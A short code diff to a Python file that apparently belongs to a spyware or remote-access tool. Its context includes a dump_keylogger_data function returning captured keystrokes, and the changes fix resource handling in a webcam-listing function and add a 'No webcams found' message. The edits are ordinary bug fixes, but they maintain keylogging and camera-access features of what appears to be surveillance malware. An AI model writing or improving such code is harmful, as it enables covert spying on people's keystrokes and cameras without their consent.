@@ -235,7 +235,6 @@ def dump_keylogger_data():
     # Join the captured keylogger data into a single string and return it as one line
     return ''.join(keylogger_data)
 
-# Function to list webcams
 def list_webcams():
     webcams = []
     index = 0
@@ -246,13 +245,16 @@ def list_webcams():
                 # Get the webcam name (this depends on your platform)
                 webcam_name = f"{index}: {cap.getBackendName()}"
                 webcams.append(webcam_name)
-                cap.release()
+                cap.release()  # Release the capture object after checking
             else:
+                cap.release()
                 break
         except Exception as e:
             print(f"Error accessing camera at index {index}: {e}")
             break
         index += 1
+    if not webcams:
+        return "No webcams found."
     return '\n'.join(webcams)
 
 
